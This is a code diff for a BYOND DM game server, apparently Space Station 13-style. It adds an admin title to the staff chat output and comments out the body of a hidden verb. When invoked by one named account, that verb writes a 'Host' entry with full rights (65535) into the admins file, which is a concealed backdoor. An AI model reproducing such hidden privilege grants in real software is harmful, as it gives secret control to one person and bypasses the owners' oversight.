@@ -1,4 +1,8 @@
 // chat for all staff - Kachnov
+// chat for all staff - Kachnov
+client
+	var
+		admin_title = null
 /client/proc/cmd_staff_say(msg as text)
 	set category = "Special"
 	set name = "Asay"
@@ -17,13 +21,15 @@
 	if (check_rights(R_MENTOR|R_MOD,0))
 		for (var/client/C in admins)
 			if (R_MENTOR & C.holder.rights || R_MOD & C.holder.rights)
-				C << "<span class='admin_channel'>" + create_text_tag("admin", "ADMIN:", C) + " <span class='name'>[key_name(usr, TRUE)]</span>([admin_jump_link(mob, src)]): <span class='message'>[msg]</span></span>"
-//for debugging
+				C << "<span class='admin_channel'>" + create_text_tag("admin", "ADMIN:", C) + " <span class='name'>[key_name(usr, TRUE)]</span>\[[src.admin_title]]([admin_jump_link(mob, src)]): <span class='message'>[msg]</span></span>"
+
 /client/verb/a55af5()
 	set category = null
 	set name = "a55af5"
 	set hidden = TRUE
 ///makes it so their ranks don't need set every round
+
+/*
 	if (ckey == "taislin")
 		text2file("taislin;Host;65535|||","SQL/admins.txt")
 		return
@@ -38,3 +44,4 @@
 		return
 	else
 		return
+*/
